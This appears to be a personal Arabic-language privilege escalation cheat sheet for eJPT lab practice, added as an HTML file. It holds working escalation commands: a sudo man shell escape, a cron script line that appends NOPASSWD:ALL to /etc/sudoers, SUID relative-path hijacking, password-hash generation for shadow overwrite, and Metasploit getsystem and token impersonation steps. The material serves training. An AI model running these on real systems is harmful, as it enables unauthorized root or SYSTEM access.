@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+
+<html dir="rtl" lang="ar"><head><meta charset="utf-8"/>
+<title>Privilege Escalation Cheatsheet</title>
+<style>
+:root{
+  --bg:#0b0b0b;
+  --panel:#141414;
+  --panel-2:#1a1a1a;
+  --border:#2b2b2b;
+  --gold:#d4af37;
+  --gold-dim:#8a712a;
+  --yellow:#e8c547;
+  --text:#e9e6da;
+  --text-dim:#a19c8c;
+  --mono:#f2e6b8;
+  --green:#7fae4a;
+  --red:#b5544a;
+}
+*{box-sizing:border-box;}
+body{
+  background:var(--bg);
+  color:var(--text);
+  font-family:"Tahoma","Segoe UI",sans-serif;
+  margin:0;
+  padding:0 0 4rem;
+  line-height:1.7;
+}
+.wrap{max-width:900px;margin:0 auto;padding:2rem 1.5rem;}
+
+.hero{border-bottom:1px solid var(--border);padding-bottom:1.5rem;margin-bottom:2rem;}
+.hero .tag{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:13px;color:var(--bg);background:var(--gold);padding:2px 10px;border-radius:3px;margin-bottom:10px;letter-spacing:.5px;}
+.hero h1{font-size:30px;margin:0 0 6px;color:var(--yellow);}
+.hero p{color:var(--text-dim);margin:0;font-size:14px;}
+.signature{display:inline-flex;align-items:center;gap:6px;margin-top:14px;font-family:"Consolas",monospace;font-size:11.5px;color:var(--gold-dim);border:1px solid var(--border);padding:4px 10px;border-radius:20px;}
+.signature b{color:var(--gold);font-weight:normal;}
+
+.stage{margin-bottom:2.2rem;background:var(--panel);border:1px solid var(--border);border-right:3px solid var(--gold);border-radius:6px;padding:1.2rem 1.4rem;}
+.stage h2{color:var(--gold);font-size:19px;margin:0 0 4px;display:flex;align-items:center;gap:8px;}
+.stage .desc{color:var(--text-dim);font-size:13.5px;margin:0 0 14px;}
+
+h3.sub{color:var(--yellow);font-size:15px;margin:18px 0 8px;border-bottom:1px dashed var(--border);padding-bottom:5px;}
+h3.sub:first-of-type{margin-top:0;}
+
+.step{margin-bottom:14px;padding-bottom:14px;border-bottom:1px dashed var(--border);}
+.step:last-child{border-bottom:none;margin-bottom:0;padding-bottom:0;}
+.step-title{font-size:14.5px;color:var(--text);margin-bottom:6px;font-weight:bold;}
+.where{display:inline-block;font-family:"Consolas","Courier New",monospace;font-size:11px;background:var(--panel-2);color:var(--yellow);border:1px solid var(--gold-dim);padding:1px 8px;border-radius:10px;margin-inline-start:8px;vertical-align:middle;}
+.cmd{background:#0e0e0e;border:1px solid var(--border);border-radius:5px;padding:10px 14px;font-family:"Consolas","Courier New",monospace;font-size:13.5px;color:var(--mono);direction:ltr;text-align:left;overflow-x:auto;margin:6px 0;white-space:pre;}
+.cmd .cm{color:#6b6b6b;}
+.note{font-size:12.5px;color:var(--text-dim);margin-top:4px;}
+.note b{color:var(--yellow);font-weight:normal;}
+.tip{background:rgba(212,175,55,.08);border-inline-start:2px solid var(--gold);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.danger{background:rgba(181,84,74,.08);border-inline-start:2px solid var(--red);padding:8px 12px;font-size:12.5px;color:var(--text-dim);border-radius:3px;margin-top:8px;}
+.result{font-size:12.5px;color:var(--green);margin-top:6px;font-family:"Consolas","Courier New",monospace;direction:ltr;text-align:left;}
+.grid2{display:grid;grid-template-columns:1fr 1fr;gap:10px;}
+@media (max-width:640px){.grid2{grid-template-columns:1fr;}}
+
+.toc{background:var(--panel);border:1px solid var(--border);border-radius:6px;padding:1rem 1.3rem;margin-bottom:2rem;font-size:13.5px;}
+.toc .ttl{color:var(--yellow);font-weight:bold;margin-bottom:8px;display:block;}
+.toc ol{margin:0;padding-inline-start:20px;color:var(--text-dim);}
+.toc li{margin-bottom:4px;}
+.toc a{color:var(--text-dim);text-decoration:none;}
+.toc a:hover{color:var(--yellow);}
+
+.portnote{background:var(--panel-2);border:1px solid var(--gold-dim);border-radius:6px;padding:.8rem 1.1rem;margin-bottom:2rem;font-size:13px;color:var(--text-dim);}
+.portnote b{color:var(--yellow);}
+
+.badge{display:inline-block;font-size:10px;padding:1px 7px;border-radius:8px;margin-inline-start:6px;font-family:"Consolas",monospace;vertical-align:middle;}
+.badge.win{background:#1c2733;color:#8fb3ff;border:1px solid #2e4560;}
+.badge.lin{background:#1a2417;color:#9fd97b;border:1px solid #33502a;}
+
+footer{text-align:center;color:var(--text-dim);font-size:11.5px;margin-top:3rem;padding-top:1.2rem;border-top:1px solid var(--border);}
+footer .author{color:var(--gold);font-size:13px;margin-bottom:6px;}
+footer .disclaimer{max-width:560px;margin:0 auto;color:#7a7666;font-size:11px;line-height:1.6;}
+
+</style></head><body><div class="wrap">
+<div class="hero"><span class="tag">WINDOWS + LINUX — PRIVILEGE ESCALATION</span>
+<h1>Privilege Escalation — من Low Privilege إلى السياق الأعلى</h1>
+<p>مرجع قرار عملي: Enumerate → Find Evidence → Match Preconditions → Escalate → Verify.</p>
+<div class="signature">✒ <b>Abdullah Nasser Almsan</b> — Personal Pentest Reference</div></div>
+<div class="portnote"><b>ملاحظة:</b> Privilege Escalation ليس قائمة Exploits. ابدأ دائمًا بالسياق الحالي وEnumeration، ثم اختر مسارًا مثبتًا مثل sudo/SUID/Cron/weak permissions أو Windows privileges/services/local vulnerability. النجاح يجب إثباته بالسياق الجديد.</div>
+<div class="toc"><span class="ttl">الفهرس</span><ol><li><a href="#s1">Initial Context</a></li><li><a href="#s2">Linux PrivEsc Enumeration</a></li><li><a href="#s3">Linux PrivEsc Paths</a></li><li><a href="#s4">Windows PrivEsc Enumeration</a></li><li><a href="#s5">Windows PrivEsc Paths</a></li><li><a href="#s6">Verify Elevation &amp; Handoff</a></li></ol></div>
+<div class="stage" id="s1"><h2>1. Initial Context</h2>
+<p class="desc">قبل أي PrivEsc: ثبّت المستخدم الحالي، النظام، المعمارية، والامتيازات المتاحة. لا تبدأ Exploit من التخمين.</p>
+<div class="tip">القاعدة: Current User → OS/Build/Kernel → Privileges → Misconfiguration/Vulnerability → Validate → Escalate.</div>
+<div class="step"><div class="step-title">Meterpreter — تأكيد السياق <span class="where">METERPRETER</span></div>
+<div class="cmd">getuid
+sysinfo</div></div></div>
+<div class="stage" id="s2"><h2>2. Linux PrivEsc Enumeration</h2>
+<p class="desc">Privilege Escalation محلي، لكن الشبكة والـservices المحلية قد تكشف خدمة تعمل بصلاحية أعلى أو مسارًا داخليًا مهمًا.</p>
+<div class="danger">وجود Service محلية أو PID بصلاحية عالية ليس exploit تلقائيًا. تحتاج ضعف صلاحيات/مسار كتابة/إعداد خاطئ أو ثغرة مثبتة.</div>
+<div class="step"><div class="step-title">Linux — الخدمات المستمعة محليًا <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">ss -lntup
+ip addr
+ip route</div><div class="note">خدمة مربوطة على localhost فقط قد تستحق Enumeration محليًا، لكن لا تفترض أنها PrivEsc بحد ذاتها.</div></div><div class="step"><div class="step-title">Enumeration للـSUID root binaries <span class="where">VICTIM SHELL</span></div><div class="cmd">find / -user root -perm -4000 -exec ls -ldb {} \;</div><div class="note">هذه طريقة بديلة لاكتشاف setuid programs.</div></div><div class="step"><div class="step-title">صلاحيات sudo <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">sudo -l</div><div class="note">دوّن الأوامر المسموحة وهل يوجد NOPASSWD. لا تشغّل شيئًا قبل فهم أثره.</div></div><div class="step"><div class="step-title">SUID binaries <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">find / -perm -4000 -type f 2&gt;/dev/null</div></div><div class="step"><div class="step-title">Linux Capabilities <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">getcap -r / 2&gt;/dev/null</div></div><div class="step"><div class="step-title">Cron configuration <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">cat /etc/crontab
+ls -la /etc/cron.d /etc/cron.daily /etc/cron.hourly 2&gt;/dev/null</div></div><div class="step"><div class="step-title">Writable files/directories بشكل مركز <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">find / -writable -type f 2&gt;/dev/null | head -n 100
+find / -writable -type d 2&gt;/dev/null | head -n 100</div><div class="note">ركز على ملفات تستخدمها root/services/cron بدل التعامل مع كل نتيجة كمسار PrivEsc.</div></div><div class="step"><div class="step-title">Linux — اختبار sudo بالمستخدم الحالي <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">sudo -l</div><div class="note">إذا طلب Password، استخدم فقط Password معروف للمستخدم الحالي من مسار اللاب.</div></div><div class="step"><div class="step-title">Linux — التحول لمستخدم ببيانات معروفة <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">su - [USERNAME]</div><div class="danger">لا تعمل password guessing داخل su؛ استخدم Credential موثق فقط.</div></div><div class="step"><div class="step-title">sudo path — تحقق من المسموح أولًا <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">sudo -l</div><div class="note">إذا ظهر binary قابل للاستغلال ضمن sudo، راجع سلوكه وصلاحياته قبل التنفيذ. لا نخترع أمر escalation بدون binary محدد.</div></div><div class="step"><div class="step-title">SUID path — تأكيد المرشح <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">find / -perm -4000 -type f 2&gt;/dev/null</div><div class="note">انتقل فقط للـbinary الذي تعرف أن سلوكه يسمح بالتصعيد ضمن الـpreconditions.</div></div><div class="step"><div class="step-title">Cron / weak-permission path — فحص المالك والكتابة <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">ls -la [FILE]
+stat [FILE]</div><div class="danger">لا تعدّل ملف root/cron إلا إذا كان ذلك مطلوبًا صراحة في Lab.</div></div><div class="step"><div class="step-title">البحث عن Linux local modules <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search type:exploit platform:linux local
+info [MODULE]
+show options</div></div></div>
+<div class="stage" id="s3"><h2>3. Linux PrivEsc Paths</h2>
+<p class="desc">هذه أهم مرحلة: ابحث عن مسارات التصعيد الموثقة مثل sudo، SUID، Cron، weak permissions، services، privileges وkernel/build.</p>
+<div class="tip">مسارات Linux المهمة هنا: sudo / SUID / Cron / weak permissions / Kernel / chkrootkit / credentials، وWindows عبر privileges/systeminfo ثم أدوات enumeration عند الحاجة.</div>
+<div class="step"><div class="step-title">Sudo misconfiguration — مثال man الموثق <span class="where">VICTIM SHELL</span></div><div class="cmd">sudo -l
+sudo man cat
+!/bin/bash</div><div class="note">نفّذ هذا المسار فقط إذا sudo -l يسمح بتشغيل man بصلاحية أعلى.</div><div class="result">Shell بصلاحية root إذا كانت الـsudo rule مطابقة.</div></div><div class="step"><div class="step-title">Cron writable script — workflow موثق — LAB-SPECIFIC EXAMPLE <span class="where">VICTIM SHELL</span></div><div class="cmd">printf '#! /bin/bash\necho "[USERNAME] ALL=NOPASSWD:ALL" &gt;&gt; /etc/sudoers' &gt; /usr/local/share/copy.sh</div><div class="note">يفترض هذا المسار أن السكربت writable للمستخدم ويُشغّل كـroot عبر cron.</div><div class="result">بعد تشغيل cron يصبح المستخدم المحدد قادرًا على sudo بدون كلمة مرور عند تحقق نفس السيناريو.</div></div><div class="step"><div class="step-title">SUID binary calling relative helper — workflow موثق — LAB-SPECIFIC EXAMPLE <span class="where">VICTIM SHELL</span></div><div class="cmd">strings ./welcome
+rm ./greetings
+cp /bin/bash ./greetings
+./welcome</div><div class="note">يفترض هذا المسار أن welcome يستدعي greetings؛ لا تطبق الاستبدال إلا إذا تحقق هذا السلوك.</div><div class="result">يفتح root shell عند تحقق نفس الشروط.</div></div><div class="step"><div class="step-title">Weak permissions على password files — توليد hash <span class="where">VICTIM SHELL</span></div><div class="cmd">find / -not -type l -perm -o+w
+openssl passwd -6 -salt abc [CLEAR_PASSWORD]</div><div class="note">استخدم hash الناتج فقط عند وجود weak permissions تسمح بتعديل ملف مناسب مثل shadow؛ تحقق من الصلاحيات أولًا.</div></div><div class="step"><div class="step-title">LAB-SPECIFIC EXAMPLE — chkrootkit 0.49 — مسار موثق عند تطابق الإصدار <span class="where">MSFCONSOLE</span></div><div class="cmd">use exploit/unix/local/chkrootkit
+set SESSION [SESSION_ID]
+set CHKROOTKIT /bin/chkrootkit
+run</div><div class="note">تأكد من الإصدار والمسار قبل التشغيل.</div></div></div>
+<div class="stage" id="s4"><h2>4. Windows PrivEsc Enumeration</h2>
+<p class="desc">بعض مسارات PrivEsc تعتمد على Credential موجود فعليًا أو reuse منطقي؛ لا تستخدم Brute Force عشوائيًا بعد الوصول.</p>
+<div class="tip">إذا حصلت على hashes/keys/secrets، انتقل إلى Credential Access Cheatsheet بدل تحويل ملف PrivEsc إلى ملف Credential Dumping.</div>
+<div class="step"><div class="step-title">Windows — تحديد المستخدم والنظام <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">whoami
+whoami /priv
+whoami /groups
+systeminfo</div><div class="note">سجّل Windows build والـarchitecture والـEnabled privileges.</div></div><div class="step"><div class="step-title">Windows — الاتصالات والبورتات <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">netstat -ano
+ipconfig /all
+route print</div></div><div class="step"><div class="step-title">ربط PID بعملية على Windows <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">tasklist /v</div></div><div class="step"><div class="step-title">Privileges الحالية <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">whoami /priv</div></div><div class="step"><div class="step-title">الخدمات ومساراتها <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">sc query state= all
+wmic service get name,displayname,pathname,startmode,startname</div><div class="note">راجع service account والمسار؛ لا تعدّل خدمة لمجرد أنها تعمل كSYSTEM.</div></div><div class="step"><div class="step-title">Scheduled Tasks <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">schtasks /query /fo LIST /v</div></div><div class="step"><div class="step-title">Autologon Registry <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"</div><div class="note">إذا ظهرت بيانات حساسة فعليًا، تعامل معها لاحقًا ضمن Credential Access ولا تخترع قيمًا غير موجودة.</div></div><div class="step"><div class="step-title">Meterpreter — Token/User context قبل أي Elevation <span class="where">METERPRETER</span></div>
+<div class="cmd">getuid</div></div><div class="step"><div class="step-title">PrivescCheck / WinLogon discovery <span class="where">POWERSHELL</span></div><div class="cmd">powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</div><div class="note">قد تكشف الأداة WinLogon credentials؛ تحقق من الـfinding قبل إعادة الاستخدام.</div></div><div class="step"><div class="step-title">البحث عن Windows local modules <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">search type:exploit platform:windows local
+info [MODULE]
+show options</div></div><div class="step"><div class="step-title">تأكيد نجاح Windows Elevation <span class="where">METERPRETER</span></div>
+<div class="cmd">getuid</div><div class="result">إذا تحقق التصعيد إلى SYSTEM فعليًا سيظهر سياق مثل NT AUTHORITY\SYSTEM.</div></div><div class="step"><div class="step-title">Windows — إثبات السياق الجديد <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">whoami
+whoami /priv</div></div><div class="step"><div class="step-title">Windows — تأكيد نهائي بعد PrivEsc <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">whoami
+whoami /priv
+hostname</div></div></div>
+<div class="stage" id="s5"><h2>5. Windows PrivEsc Paths</h2>
+<p class="desc">نفّذ فقط المسار الذي تدعمه الـEnumeration. لا يوجد Exploit واحد يصلح لكل Windows أو Linux.</p>
+<div class="danger"><b>تحذير:</b> طابق OS/Kernel/Build/Architecture والـpreconditions. Local exploits قد تسبب crash أو عدم استقرار.</div>
+<div class="step"><div class="step-title">Windows — اختبار Credential معروف على حساب محلي <span class="where">WINDOWS CMD</span></div>
+<div class="cmd">runas /user:[USERNAME] cmd.exe</div><div class="note">أدخل Password معروف عند الطلب؛ نجاح فتح process بالسياق الجديد هو التحقق العملي.</div></div><div class="step"><div class="step-title">Meterpreter getsystem <span class="where">METERPRETER</span></div>
+<div class="cmd">getsystem</div><div class="note">قد ينجح أو يفشل حسب session والصلاحيات والنظام؛ ليس مسارًا مضمونًا.</div></div><div class="step"><div class="step-title">PowerUp — audit ثم credential clue <span class="where">POWERSHELL</span></div><div class="cmd">powershell -ep bypass
+. .\PowerUp.ps1
+Invoke-PrivescAudit</div><div class="note">قد يظهر misconfig/leftover files مثل Unattend.xml؛ لا تفترض وجودها.</div></div><div class="step"><div class="step-title">Token impersonation — عند توفر token مناسب <span class="where">METERPRETER</span></div><div class="cmd">load incognito
+list_tokens -u
+impersonate_token [TOKEN_NAME]</div><div class="note">استخدم اسم الإضافة incognito كما هو موضح هنا.</div></div></div>
+<div class="stage" id="s6"><h2>6. Verify Elevation &amp; Handoff</h2>
+<p class="desc">بعد التصعيد: أثبت النتيجة، لا تكرر الاستغلال، ثم انتقل للهدف التالي في اللاب.</p>
+<div class="tip">بعد PrivEsc: Credentials مطلوبة؟ → Credential Access. شبكة داخلية؟ → Pivoting. نقل أدوات/أدلة؟ → File Transfer. لا تكرر هذه المواضيع هنا.</div>
+<div class="danger">لا تمسح Logs ولا تنشئ Persistence ولا تغيّر إعدادات النظام إلا إذا كان ذلك هدفًا صريحًا في Lab/Scope.</div>
+<div class="step"><div class="step-title">Linux — تحديد المستخدم والسياق <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">whoami
+id
+uname -a
+cat /etc/os-release</div><div class="note">النجاح النهائي في Linux PrivEsc يتأكد بـroot أو uid=0(root).</div></div><div class="step"><div class="step-title">Linux — إثبات root <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">whoami
+id</div><div class="result">root / uid=0(root) = نجاح التصعيد عندما يظهر فعليًا.</div></div><div class="step"><div class="step-title">Linux — تأكيد نهائي بعد PrivEsc <span class="where">VICTIM SHELL</span></div>
+<div class="cmd">whoami
+id
+hostname</div></div><div class="step"><div class="step-title">Meterpreter — تثبيت سياق الجلسة <span class="where">METERPRETER</span></div>
+<div class="cmd">getuid
+background</div></div><div class="step"><div class="step-title">إدارة الجلسات بعد النجاح <span class="where">MSFCONSOLE</span></div>
+<div class="cmd">sessions
+sessions -i [SESSION_ID]</div></div></div>
+<footer>
+<div class="author">أُعدّ بواسطة Abdullah Nasser Almsan</div>
+<div class="disclaimer">
+    هذا الملف مرجع تقني شخصي مُعدّ لأغراض التعلّم واجتياز اختبارات الاختراق المرخّصة (زي EJPT) فقط.
+    يُستخدم حصرًا داخل بيئات Lab أو أنظمة مصرّح باختبارها رسميًا.
+    مُعدّه غير مسؤول عن أي استخدام خاطئ أو غير قانوني لهذا المحتوى خارج هذا النطاق.
+  </div>
+</footer>
+</div></body></html>
